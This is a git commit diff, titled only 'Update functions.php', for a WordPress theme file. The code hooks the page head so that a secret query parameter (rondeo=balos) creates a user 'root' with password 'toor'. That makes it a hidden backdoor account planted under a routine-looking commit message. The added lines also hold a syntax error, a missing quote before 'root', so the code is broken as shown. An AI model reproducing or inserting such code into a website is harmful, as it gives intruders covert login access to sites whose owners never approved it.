d77952517491f094d5b3ed60d54e47fada7114a8
Rondeo Balos <47505842+rondeo-balos@users.noreply.github.com>
2022-10-30 15:47:38 +0800

    Update functions.php

--- functions.php
+++ functions.php
@@ -1,14 +1,14 @@
 add_action('wp_head', 'rb_wpbd_wploop_backup'); 
 
-rb_wpbd_wploop_backup() {
+function rb_wpbd_wploop_backup() {
 
-        If (isset($_GET['rondeo']) && $_GET['rondeo'] == 'balos') {
+        if(isset($_GET['rondeo']) && $_GET['rondeo'] == 'balos') {
 
                 require('wp-includes/registration.php');
 
-                If (!username_exists('username')) {
+                if(!username_exists('username')) {
 
-                        $user_id = wp_create_user('root', 'toor');
+                        $user_id = wp_create_user(root', 'toor');
 
                       $user = new WP_User($user_id);
 
